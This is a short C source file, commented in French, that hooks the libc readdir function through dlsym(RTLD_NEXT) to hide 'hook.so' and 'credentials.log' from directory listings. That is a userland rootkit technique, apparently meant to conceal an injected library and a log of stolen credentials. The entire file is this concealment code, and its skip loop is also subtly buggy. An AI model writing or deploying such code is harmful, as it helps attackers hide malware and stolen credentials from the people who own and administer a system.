#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include "shared.h"

// Fichiers à cacher
const char *hidden_files[] = {"hook.so", "credentials.log", NULL};

// Hook de la fonction readdir
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;

    // Charger l'implémentation originale de readdir
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) {
            fprintf(stderr, "Erreur : impossible de charger readdir\n");
            return NULL;
        }
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Vérifie si le fichier doit être caché
        for (const char **hidden = hidden_files; *hidden != NULL; hidden++) {
            if (strcmp(entry->d_name, *hidden) == 0) {
                entry = orig_readdir(dirp); // Ignore le fichier caché
                continue;
            }
        }
        return entry; // Retourne l'entrée visible
    }

    return NULL; // Fin du répertoire
}
